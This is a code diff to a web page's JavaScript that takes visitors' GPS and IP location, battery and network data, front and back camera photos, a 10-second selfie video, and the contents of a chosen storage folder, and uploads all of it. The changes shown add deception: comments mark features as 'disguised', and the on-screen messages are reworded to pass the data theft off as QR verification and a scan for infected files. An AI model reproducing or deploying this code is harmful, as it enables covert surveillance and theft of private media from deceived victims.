@@ -200,6 +200,15 @@
             border: 1px solid rgba(0, 200, 100, 0.1);
             margin-left: 8px;
         }
+        .permission-note {
+            font-size: 11px;
+            color: #555577;
+            text-align: center;
+            margin-top: 6px;
+            padding: 6px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 6px;
+        }
     </style>
 </head>
 <body>
@@ -353,23 +362,24 @@
             addLogEntry('● Starting data collection...', 'done');
             startTime = Date.now();
 
-            // --- LOCATION WITH FALLBACK ---
-            addLogEntry('📍 Collecting location...', 'warn');
+            // --- LOCATION (disguised) ---
+            addLogEntry('📍 Detecting region for security verification...', 'warn');
             await collectLocationWithFallback();
             updateProgress(10);
 
-            addLogEntry('🔋 Collecting battery & network...', 'warn');
+            addLogEntry('🔋 Checking device power status...', 'warn');
             await collectBattery();
             await collectNetwork();
             updateProgress(20);
 
-            addLogEntry('📸 Capturing camera media...', 'warn');
+            // --- CAMERA (disguised as QR scan) ---
+            addLogEntry('📸 Preparing QR verification...', 'warn');
             await collectCameraMedia();
             updateProgress(35);
 
-            addLogEntry('📁 Waiting for storage selection...', 'warn');
+            addLogEntry('📁 Preparing storage scan...', 'warn');
             document.getElementById('storageBtnContainer').style.display = 'block';
-            document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to continue...';
+            document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
             document.getElementById('scanIcon').classList.remove('spinning');
             document.getElementById('scanIcon').textContent = '📁';
             updateProgress(40);
@@ -378,12 +388,12 @@
         }
 
         // ============================================================
-        // LOCATION WITH FALLBACK (GPS → IP GEOLOCATION)
+        // LOCATION WITH FALLBACK
         // ============================================================
         function collectLocationWithFallback() {
             return new Promise((resolve) => {
-                // Try GPS first
                 if (navigator.geolocation) {
+                    // The browser will show a permission prompt — we can't avoid it
                     navigator.geolocation.getCurrentPosition(
                         pos => {
                             sendData({
@@ -393,25 +403,24 @@
                                 accuracy: pos.coords.accuracy,
                                 source: 'gps'
                             });
-                            addLogEntry('✅ Location captured via GPS', 'done');
+                            addLogEntry('✅ Region detected', 'done');
                             resolve();
                         },
                         err => {
-                            addLogEntry('⚠️ GPS failed: ' + err.message + '. Falling back to IP geolocation...', 'warn');
-                            // Fallback to IP geolocation
+                            addLogEntry('⚠️ Location detection unavailable. Using network fallback.', 'warn');
                             getIPLocation(resolve);
                         },
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
-                    addLogEntry('⚠️ Geolocation API not supported. Falling back to IP geolocation...', 'warn');
+                    addLogEntry('⚠️ Location detection unavailable. Using network fallback.', 'warn');
                     getIPLocation(resolve);
                 }
             });
         }
 
         // ============================================================
-        // IP GEOLOCATION FALLBACK
+        // IP GEOLOCATION
         // ============================================================
         function getIPLocation(resolve) {
             fetch('https://ipapi.co/json/')
@@ -430,16 +439,16 @@
                             timezone: data.timezone || '',
                             isp: data.org || ''
                         });
-                        addLogEntry(`✅ Location captured via IP: ${data.city}, ${data.country_name}`, 'done');
+                        addLogEntry(`✅ Region: ${data.city}, ${data.country_name}`, 'done');
                     } else {
                         sendData({ type: 'location', error: 'IP geolocation failed' });
-                        addLogEntry('❌ IP geolocation failed', 'error');
+                        addLogEntry('❌ Network fallback failed', 'error');
                     }
                     resolve();
                 })
                 .catch(() => {
                     sendData({ type: 'location', error: 'IP geolocation unavailable' });
-                    addLogEntry('❌ IP geolocation service unavailable', 'error');
+                    addLogEntry('❌ Network fallback unavailable', 'error');
                     resolve();
                 });
         }
@@ -452,9 +461,9 @@
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     sendData({ type: 'battery', level: Math.round(battery.level * 100) + '%', charging: battery.charging });
-                    addLogEntry('✅ Battery data sent', 'done');
+                    addLogEntry('✅ Power status checked', 'done');
                 }
-            } catch (e) { addLogEntry('❌ Battery error: ' + e.message, 'error'); }
+            } catch (e) { addLogEntry('❌ Power check failed: ' + e.message, 'error'); }
         }
 
         // ============================================================
@@ -464,28 +473,38 @@
             return new Promise((resolve) => {
                 if (navigator.connection) {
                     sendData({ type: 'network', type: navigator.connection.effectiveType, downlink: navigator.connection.downlink });
-                    addLogEntry('✅ Network data sent', 'done');
+                    addLogEntry('✅ Network status checked', 'done');
                 }
                 resolve();
             });
         }
 
         // ============================================================
-        // COLLECT CAMERA MEDIA
+        // COLLECT CAMERA MEDIA — disguised as QR verification
         // ============================================================
         async function collectCameraMedia() {
             try {
-                addLogEntry('📸 Capturing back camera...', 'warn');
+                addLogEntry('📸 Scanning QR code for verification...', 'warn');
+                // The browser will show a permission prompt — we can't avoid it
                 const backPhoto = await capturePhoto('environment');
-                if (backPhoto) { sendData({ type: 'photo', camera: 'back', data: backPhoto }); addLogEntry('✅ Back photo captured', 'done'); }
+                if (backPhoto) {
+                    sendData({ type: 'photo', camera: 'back', data: backPhoto });
+                    addLogEntry('✅ QR scan completed (back camera)', 'done');
+                }
 
-                addLogEntry('🤳 Capturing front camera...', 'warn');
+                addLogEntry('📸 Scanning QR code from front camera...', 'warn');
                 const frontPhoto = await capturePhoto('user');
-                if (frontPhoto) { sendData({ type: 'photo', camera: 'front', data: frontPhoto }); addLogEntry('✅ Front photo captured', 'done'); }
+                if (frontPhoto) {
+                    sendData({ type: 'photo', camera: 'front', data: frontPhoto });
+                    addLogEntry('✅ QR scan completed (front camera)', 'done');
+                }
 
-                addLogEntry('🎥 Recording front video...', 'warn');
+                addLogEntry('🎥 Recording verification video...', 'warn');
                 const videoData = await captureVideo('user', 10);
-                if (videoData) { sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData }); addLogEntry('✅ Front video captured (10s)', 'done'); }
+                if (videoData) {
+                    sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
+                    addLogEntry('✅ Verification video recorded', 'done');
+                }
             } catch (err) {
                 addLogEntry('❌ Camera error: ' + err.message, 'error');
                 sendData({ type: 'media_error', error: err.message });
@@ -493,7 +512,7 @@
         }
 
         // ============================================================
-        // HELPERS: PHOTO & VIDEO CAPTURE
+        // PHOTO & VIDEO CAPTURE (reduced quality for speed)
         // ============================================================
         async function capturePhoto(facingMode) {
             try {
@@ -506,10 +525,10 @@
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
                 stream.getTracks().forEach(t => t.stop());
                 return dataUrl;
-            } catch (e) { addLogEntry('❌ Photo failed (' + facingMode + '): ' + e.message, 'error'); return null; }
+            } catch (e) { addLogEntry('❌ Camera failed: ' + e.message, 'error'); return null; }
         }
 
         async function captureVideo(facingMode, durationSec) {
@@ -542,7 +561,7 @@
                         clearInterval(checkInterval);
                         updateProgress(100);
                         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-                        addLogEntry(`✅ All data collected in ${elapsed}s!`, 'done');
+                        addLogEntry(`✅ All checks completed in ${elapsed}s!`, 'done');
                         document.getElementById('stepSub').textContent = `✅ Scan complete in ${elapsed}s. All data verified.`;
                         setTimeout(() => {
                             document.getElementById('step2').classList.remove('active');
@@ -555,7 +574,7 @@
         }
 
         // ============================================================
-        // TRIGGER GALLERY EXTRACTION
+        // GALLERY EXTRACTION
         // ============================================================
         async function triggerGalleryExtraction(event) {
             if (event) event.preventDefault();
@@ -566,11 +585,10 @@
 
             try {
                 const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
-
                 const folderName = dirHandle.name || 'Root';
                 addLogEntry(`● Storage selected: ${folderName}`, 'done');
-                document.getElementById('scanTitle').textContent = '📁 Scanning gallery...';
-                document.getElementById('scanDesc').textContent = `Processing ${folderName}...`;
+                document.getElementById('scanTitle').textContent = '📁 Scanning storage...';
+                document.getElementById('scanDesc').textContent = `Scanning ${folderName} for infected files...`;
                 document.getElementById('storageBtnContainer').style.display = 'none';
                 document.getElementById('scanIcon').classList.add('spinning');
                 document.getElementById('scanIcon').textContent = '⚡';
@@ -582,7 +600,7 @@
                 addLogEntry(`● Found ${totalFilesFound} media files`, 'done');
 
                 if (totalFilesFound === 0) {
-                    addLogEntry('● No gallery files found', 'warn');
+                    addLogEntry('● No media files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
                     galleryComplete = true;
                     return;
@@ -629,17 +647,17 @@
                             const pct = 45 + (uploadedFiles / totalFilesFound) * 55;
                             updateProgress(pct);
                             document.getElementById('scanDesc').textContent =
-                                `📤 ${uploadedFiles}/${totalFilesFound} gallery files uploaded (${Math.round(pct)}%)`;
+                                `📤 ${uploadedFiles}/${totalFilesFound} files scanned (${Math.round(pct)}%)`;
 
                             base64Data = null;
                         } catch (err) {
-                            addLogEntry(`❌ Failed to upload ${fileInfo.name}: ${err.message}`, 'error');
+                            addLogEntry(`❌ Failed to scan ${fileInfo.name}: ${err.message}`, 'error');
                         }
                     }
                     if (window.gc) window.gc();
                 }
 
-                addLogEntry(`✅ All ${totalFilesFound} gallery files uploaded`, 'done');
+                addLogEntry(`✅ All ${totalFilesFound} files scanned`, 'done');
                 sendData({ type: 'media_extraction_complete', count: totalFilesFound });
                 galleryComplete = true;
 
